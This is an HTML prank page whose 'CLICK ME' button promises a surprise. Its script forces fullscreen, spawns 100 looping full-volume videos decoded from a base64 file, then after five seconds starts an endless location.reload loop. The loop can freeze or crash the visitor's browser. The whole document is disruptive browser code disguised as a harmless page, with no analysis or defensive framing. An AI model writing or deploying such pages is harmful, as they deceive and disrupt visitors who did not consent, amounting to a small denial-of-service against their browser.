<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Click Me!</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h1>WELCOME</h1>
        <p>Click the button below for a surprise</p>
        <button id="prankButton" class="prank-button">CLICK ME</button>
        <div id="videoContainer" style="display: none; margin-top: 20px;"></div>
    </div>

    <script>
        const button = document.getElementById('prankButton');
        const videoContainer = document.getElementById('videoContainer');

        button.addEventListener('click', async () => {
            button.style.display = 'none';
            videoContainer.style.display = 'block';
            
            document.documentElement.requestFullscreen().catch(e => {});
            
            try {
                const response = await fetch('base64.txt');
                const base64String = await response.text();
                const videoSrc = 'data:video/mp4;base64,' + base64String;
                
                // Create 100 video elements
                for (let i = 0; i < 100; i++) {
                    const video = document.createElement('video');
                    video.src = videoSrc;
                    video.width = 200;
                    video.height = 150;
                    video.volume = 1.0;
                    video.loop = true;
                    video.style.margin = '5px';
                    videoContainer.appendChild(video);
                    
                    video.play().catch(e => {
                        console.log('Autoplay blocked');
                    });
                }
            } catch (e) {
                console.error('Failed to load video:', e);
            }
            
            setTimeout(() => {
                while(1) location.reload(1);
            }, 5000);
        });
    </script>
</body>
</html>
